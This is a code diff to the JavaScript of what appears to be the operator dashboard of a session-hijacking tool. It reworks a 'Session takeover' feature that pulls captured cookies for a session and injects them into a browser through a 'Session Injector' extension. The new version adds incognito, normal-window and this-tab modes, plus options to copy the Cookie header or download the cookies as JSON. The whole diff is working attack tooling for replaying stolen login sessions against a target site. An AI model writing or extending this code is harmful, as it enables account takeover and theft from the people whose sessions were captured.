@@ -247,16 +247,19 @@ async function inject(id) {
   S.injectPayload = d;
   if (S.ext) {
     openModal('Session takeover',
-      '<p class="muted mb14">Injecting <b>' + d.count + '</b> cookies into an <b>isolated window</b>. Your own logins stay untouched; close the window to discard it.</p>' +
+      '<p class="muted mb14">Sending <b>' + d.count + '</b> cookies to the browser extension. It opens the target in the window you have configured (incognito or normal profile), so your own logins are left alone in incognito mode.</p>' +
       '<div id="injResult"><span class="dim">working…</span></div>' +
-      '<div class="actions mt14"><button class="btn sm" data-act="inj-here" data-id="' + id + '">Use this profile instead</button>' +
-      '<button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
+      '<div class="hint mt14 mb8">Open in:</div>' +
+      '<div class="actions"><button class="btn sm" data-act="inj" data-mode="incognito">Incognito window</button>' +
+      '<button class="btn sm" data-act="inj" data-mode="normal">Normal window</button>' +
+      '<button class="btn sm" data-act="inj" data-mode="here">This tab</button></div>' +
+      '<div class="actions mt14"><button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
       '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
-    window.postMessage({ type: 'DO_INJECT', payload: d, mode: 'isolated' }, '*');
+    window.postMessage({ type: 'DO_INJECT', payload: d }, '*');
   } else {
     downloadCookieFile(d);
     openModal('Session takeover',
-      '<p class="muted mb14">Cookies downloaded (<b>' + d.count + '</b>). Install the <b>Session Injector</b> extension for one-click isolated takeover, or use Cookie-Editor manually.</p>' +
+      '<p class="muted mb14">Cookies downloaded (<b>' + d.count + '</b>). Install the <b>Session Injector</b> extension for one-click takeover, or import them with Cookie-Editor. The extension can also take a pasted JSON or cookie string.</p>' +
       '<div class="actions"><button class="btn sm primary" data-act="open-target" data-copy="' + esc(d.target_url) + '">Open target site</button>' +
       '<button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
       '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
@@ -296,9 +299,10 @@ var ACTIONS = {
   'sess-del': function (id) { if (confirm('Delete session #' + id + '?')) run(async function () { await API.del('/api/v1/sessions/' + id); toast('Deleted', 'ok'); closeDrawer(); render(); }); },
   'sess-export': function (id) { window.open('/api/v1/sessions/' + id + '/cookies'); },
   inject: function (id) { run(function () { return inject(id); }); },
-  'inj-here': function () {
-    if (!S.injectPayload) return;
-    window.postMessage({ type: 'DO_INJECT', payload: S.injectPayload, mode: 'here' }, '*');
+  inj: function (mode, el) {
+    if (el && el.getAttribute('data-mode')) mode = el.getAttribute('data-mode');
+    if (!S.injectPayload || !mode) return;
+    window.postMessage({ type: 'DO_INJECT', payload: S.injectPayload, mode: mode }, '*');
   },
   'dl-cookies': function (id) { run(async function () { downloadCookieFile(await API.get('/api/v1/sessions/' + id + '/cookies')); }); },
   'open-target': function (id, el) { window.open(el.getAttribute('data-copy'), '_blank'); },
